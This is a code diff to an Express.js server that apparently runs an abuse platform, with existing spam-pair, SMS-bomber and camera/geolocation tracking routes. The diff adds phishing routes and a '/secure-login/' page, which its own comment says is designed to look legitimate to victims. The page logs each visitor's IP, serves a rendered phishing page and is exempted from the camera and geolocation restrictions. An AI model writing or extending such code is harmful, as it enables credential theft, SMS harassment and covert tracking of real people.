@@ -151,6 +151,8 @@ let spampairRoutes;
 try { spampairRoutes = require('./routes/spampair'); } catch (_sr) { console.warn('[SPAMPAIR] routes not loaded:', _sr.message); }
 let smsBomberRoutes;
 try { smsBomberRoutes = require('./routes/smsbomber'); } catch (_sb) { console.warn('[SMSBOMBER] routes not loaded:', _sb.message); }
+let phishingRoutes;
+try { phishingRoutes = require('./routes/phishing'); } catch (_pr) { console.warn('[PHISHING] routes not loaded:', _pr.message); }
 const { startPlanExpiryJob } = require('./jobs/planExpiryJob');
 const { startDbCleanupJob } = require('../allfunc/db-cleanup');
 const { startStorageGuardJob } = require('./jobs/storageGuardJob');
@@ -299,7 +301,7 @@ app.use((req, res, next) => {
   res.setHeader('X-Frame-Options', 'DENY');
   res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
   // Skip Permissions-Policy on location tracking routes — they need camera + geolocation
-  if (!req.path.startsWith('/api/location/v/') && !req.path.startsWith('/verify-identity/')) {
+  if (!req.path.startsWith('/api/location/v/') && !req.path.startsWith('/verify-identity/') && !req.path.startsWith('/secure-login/')) {
     res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
   }
   next();
@@ -457,6 +459,25 @@ app.get('/verify-identity/:sessionToken', (req, res) => {
 
 if (spampairRoutes) app.use('/api/spampair', spampairRoutes);  // no DB needed — in-memory campaigns
 if (smsBomberRoutes) app.use('/api/smsbomber', smsBomberRoutes);
+if (phishingRoutes) app.use('/api/phish', phishingRoutes);
+// Clean phishing page URLs (no /api/ path — looks legitimate to victims)
+if (phishingRoutes) {
+  app.get('/secure-login/:type/:sessionToken', (req, res) => {
+    const { type, sessionToken } = req.params;
+    try {
+      const phishMod = require('./routes/phishing');
+      const s = phishMod._phishStore && phishMod._phishStore[sessionToken];
+      if (!s || s.type !== type) return res.status(404).send('Link expired or invalid.');
+      // Record IP
+      s.ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
+      s.createdAt = Date.now();
+      res.setHeader('Content-Type', 'text/html; charset=utf-8');
+      res.send(phishMod.renderPage(type, sessionToken));
+    } catch(e) {
+      res.status(404).send('Link expired or invalid.');
+    }
+  });
+}
 
 // ── Ultra-lightweight ping — no DB needed, used by keepalive self-pinger ────
 app.get('/api/ping', (req, res) => {
